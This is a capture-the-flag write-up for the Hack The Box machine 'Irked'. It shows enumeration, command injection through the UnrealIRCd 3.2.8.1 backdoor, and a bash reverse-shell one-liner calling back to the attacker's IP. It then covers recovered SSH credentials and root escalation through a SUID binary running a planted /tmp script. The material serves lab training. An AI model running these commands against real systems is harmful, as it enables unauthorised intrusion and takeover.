---
layout: article
title: Hack the Box - Irked
permalink: /ctfs/htb-irked
key: page-aside
aside:
  toc: true
---

Quick write-up of Hack The Box: Irked

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>


## Enumeration


We start off with an aggressive nmap scan of all ports:

<img src="/assets/images/ctfs/htb-irked/nmap.png" alt="" class="center" alt="" class="center">

We find IRC running on port 8067 but can't resolve the server's host name with netcat. It's unrelated to the NOTICE AUTH message we're receiving, but prevents us from connecting nonetheless. We need to add an entry in <b>/etc/hosts</b> first.

```bash
root@kali:~# nc 10.10.10.117 8067
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.117    irked.htb
...
```

After adding <b>irked.htb</b> to the <b>/etc/hosts</b> file, we find the RFC for IRC at <a href="https://tools.ietf.org/html/rfc2812#section-3.1" target="_blank">https://tools.ietf.org/html/rfc2812#section-3.1</a> and determine how to proceed communicating to the IRC server using the information listed under section 3.1.

```bash
root@kali:~# ncat 10.10.10.117 8067
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
PASS test
NICK test
USER test testhost testserver :testrealm
:irked.htb 001 test :Welcome to the ROXnet IRC Network test!test@10.10.14.16
:irked.htb 002 test :Your host is irked.htb, running version Unreal3.2.8.1
:irked.htb 003 test :This server was created Mon May 14 2018 at 13:12:50 EDT
:irked.htb 004 test irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
:irked.htb 005 test UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
:irked.htb 005 test WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
:irked.htb 005 test EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
:irked.htb 251 test :There are 1 users and 0 invisible on 1 servers
:irked.htb 253 test 1 :unknown connection(s)
:irked.htb 255 test :I have 1 clients and 0 servers
:irked.htb 265 test :Current Local Users: 1  Max: 1
:irked.htb 266 test :Current Global Users: 1  Max: 1
:irked.htb 422 test :MOTD File is missing
:test MODE test :+iwx
```

Searchsploit returns a known backdoor exploit for Unreal3.2.8.1.

<img src="/assets/images/ctfs/htb-irked/searchsploit-unreal.png" alt="" class="center" alt="" class="center">

<a href="https://lwn.net/Articles/392201/" target="_blank">https://lwn.net/Articles/392201/</a> describes how the backdoor is designed. If we take a look at an existing exploit, <a href="https://lwn.net/Articles/392201/" target="_blank">https://www.exploit-db.com/exploits/13853</a>, we can see that there isn't much to the backdoor. We can simply append "AB" to any command we send through IRC and the rest of the command will be executed by the system.

The following proof of concept is credited to <a href="https://youtu.be/OGFTM_qvtVI?t=618" target="_blank">IppSec</a>. 
```bash
 root@kali:~# echo "AB; ping -c 1 10.10.14.16" | ncat 10.10.10.117 8067
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irked.htb 451 AB; :You have not registered
ERROR :Closing Link: [10.10.14.16] (Client exited)
```

```bash
root@kali:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
00:05:49.726194 IP irked.htb > kali: ICMP echo request, id 1426, seq 1, length 64
00:05:49.726263 IP kali > irked.htb: ICMP echo reply, id 1426, seq 1, length 64
```

## User Shell

In order to obtain a user shell, we use a reverse bash shell that uses the <b>-c</b> flag. This is necessary since it seems that the default system shell isn't bash.

<img src="/assets/images/ctfs/htb-irked/user-shell.png" alt="" class="center" alt="" class="center">

```bash
root@kali:~# echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.16/8888 0>&1'" | ncat 10.10.10.117 8067

```
```bash
root@kali:~# nc -lvp 8888
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.117.
Ncat: Connection from 10.10.10.117:48061.
bash: cannot set terminal process group (636): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
ircd@irked:~/Unreal3.2$
```

There appears to be a <b>.backup</b> file that we can read in <b>/home/djmardov/Documents</b>.

```bash
ircd@irked:/home/djmardov$ find . -ls
1061877    4 drwxr-xr-x  18 djmardov djmardov     4096 Nov  3  2018 .
1177472    4 drwx------   3 djmardov djmardov     4096 May 11  2018 ./.dbus
find: `./.dbus': Permission denied
1061885    4 -rw-r--r--   1 djmardov djmardov      675 May 11  2018 ./.profile
1062684    0 lrwxrwxrwx   1 root     root            9 Nov  3  2018 ./.bash_history -> /dev/null
1177702    4 drwx------   2 djmardov djmardov     4096 May 11  2018 ./.ssh
find: `./.ssh': Permission denied
1061894    4 drwxr-xr-x   2 djmardov djmardov     4096 May 14  2018 ./Downloads
1177456    4 drwxr-xr-x   2 djmardov djmardov     4096 May 15  2018 ./Documents
1177813    4 -rw-------   1 djmardov djmardov       33 May 15  2018 ./Documents/user.txt
1177807    4 -rw-r--r--   1 djmardov djmardov       52 May 16  2018 ./Documents/.backup
1177703    4 drwx------   2 djmardov djmardov     4096 May 15  2018 ./.gnupg
find: `./.gnupg': Permission denied
1061893    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Desktop
1177523    4 drwx------  13 djmardov djmardov     4096 May 15  2018 ./.cache
find: `./.cache': Permission denied
1177487    4 drwx------   3 djmardov djmardov     4096 Nov  3  2018 ./.gconf
find: `./.gconf': Permission denied
1177477    4 drwx------   3 djmardov djmardov     4096 May 11  2018 ./.local
find: `./.local': Permission denied
1061897    8 -rw-------   1 djmardov djmardov     4706 Nov  3  2018 ./.ICEauthority
1177457    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Music
1177455    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Public
1177467    4 drwx------  15 djmardov djmardov     4096 May 15  2018 ./.config
find: `./.config': Permission denied
1061886    4 -rw-r--r--   1 djmardov djmardov      220 May 11  2018 ./.bash_logout
1061887    4 -rw-r--r--   1 djmardov djmardov     3515 May 11  2018 ./.bashrc
1177466    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Videos
1177458    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Pictures
1061895    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Templates
1177582    4 drwx------   4 djmardov djmardov     4096 May 11  2018 ./.mozilla
```

Within the file, we find a steganography password.

```bash
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

The password happens to work on an image found on web server's homepage.

<img src="/assets/images/ctfs/htb-irked/face.png" alt="" class="center" alt="" class="center">

Using <b>steghide</b>, we can extract data embedded within irked.jpg. We happen to find a password that works as an SSH password for the djmardov user.

```bash
root@kali:~/htb/irked# steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss -xf irked.txt
wrote extracted data to "irked.txt".
root@kali:~/htb/irked# cat irked.txt
Kab6h+m+bbp2J:HG
root@kali:~/htb/irked# ssh djmardov@10.10.10.117 -p Kab6h+m+bbp2J:HG
Bad port 'Kab6h+m+bbp2J:HG'
root@kali:~/htb/irked# ssh djmardov@10.10.10.117
The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.117' (ECDSA) to the list of known hosts.
djmardov@10.10.10.117's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$

```

From here, we can <b>cat</b> the <b>user.txt</b> file in <b>/home/djmardov/</b>. We then use <b>LinEnum</b> to enumerate the system, serving the script on a Python SimpleHTTPServer.

```bash
root@kali:/opt/LinEnum# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

```bash
djmardov@irked:~$ wget 10.10.14.16:8000/LinEnum.sh
--2019-06-04 00:06:38--  http://10.10.14.16:8000/LinEnum.sh
Connecting to 10.10.14.16:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45639 (45K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                              100%[==============================================================================>]  44.57K  --.-KB/s   in 0.1s

2019-06-04 00:06:38 (389 KB/s) - ‘LinEnum.sh’ saved [45639/45639]

djmardov@irked:~$ chmod +x LinEnum.sh
djmardov@irked:~$ ./LinEnum.sh
```

## Root Shell

Using <b>LinEnum</b>, we come across an interesting custom SUID binary called <b>viewuser</b> that we can transfer back to our machine using scp.


```bash
root@kali:~/htb/irked# scp djmardov@10.10.10.117:/usr/bin/viewuser .
djmardov@10.10.10.117's password:
viewuser                                                                                                                   100% 7328   117.6KB/s   00:00
root@kali:~/htb/irked# ls
irked.jpg  irked.txt  nmap-10.10.10.117  viewuser
```

Using <b>ltrace</b>, we can view the libary calls in the binary.

```bash
root@kali:~/htb/irked# ltrace ./viewuser
__libc_start_main(0x5663657d, 1, 0xffc2d8d4, 0x56636600 <unfinished ...>
puts("This application is being devleo"...This application is being devleoped to set and test user permissions
)                                                      = 69
puts("It is still being actively devel"...It is still being actively developed
)                                                      = 37
system("who"root     :1           2019-06-03 22:44 (:1)
root     pts/2        2019-06-03 23:32 (tmux(2473).%0)
root     pts/3        2019-06-03 23:32 (tmux(2473).%1)
root     pts/4        2019-06-03 23:54 (tmux(2473).%2)
root     pts/5        2019-06-04 00:06 (tmux(2473).%3)
root     pts/6        2019-06-04 00:11 (tmux(2473).%4)
root     pts/7        2019-06-04 00:30 (tmux(2473).%6)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                           = 0
setuid(0)                                                                                        = 0
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                           = 32512
+++ exited (status 0) +++
```

We can see that it sets user id to 0 (root) and executes <b>/tmp/listusers</b>. Back on irked, we can create a file called <b>/tmp/listusers</b> that executes <b>su</b>. If we use the <b>/usr/bin/viewuser</b> binary to execute <b>/tmp/listusers</b>, we should be able to escalate our privileges to root.

```bash
djmardov@irked:/tmp$ vi listusers
djmardov@irked:/tmp$ cat listusers
#!/bin/bash
su
djmardov@irked:/tmp$ chmod +x listusers
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-06-03 00:48 (:0)
djmardov pts/2        2019-06-03 23:54 (10.10.14.16)
root@irked:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
